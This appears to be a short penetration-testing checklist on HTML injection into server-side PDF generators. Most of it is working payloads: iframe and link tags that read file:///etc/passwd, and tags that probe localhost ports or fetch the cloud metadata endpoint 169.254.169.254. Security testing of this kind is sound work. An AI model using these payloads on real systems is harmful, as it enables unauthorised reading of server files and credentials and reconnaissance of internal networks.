# PDF Generation issues

If we could inject an HTML tag to the conversion process, in some libraries, we can download almost any file from the web server. For this attack vector, we should use these tags:

## LFI

- [ ] Test iframe tags for LFI: `<iframe src="file:///etc/passwd" height=1000 width=1000/>`
  - https://medium.com/@inonst/export-injection-2eebc4f17117
  - https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo
- [ ] Test object tags for LFI: 
- [ ] Test fonts (CSS) tags for LFI: 
- [ ] Test <link> for LFI. Create an html on an attacker controlled box with the following link tag: `<link rel=attachment href=”file:///etc/passwd”>` (need to unpack the PDF)


## SSRF

- [ ] Test iframe tags for SSRF: `<img src=”http://127.0.0.1:445”/>` (check response time to determine open/closed ports)
- [ ] Test object tags for SSRF: `<object data=”http://127.0.0.1:8443”/>`
- [ ] Test fonts (CSS) tags for SSRF: `<style><iframe src=”http://169.254.169.254/user-data”>`
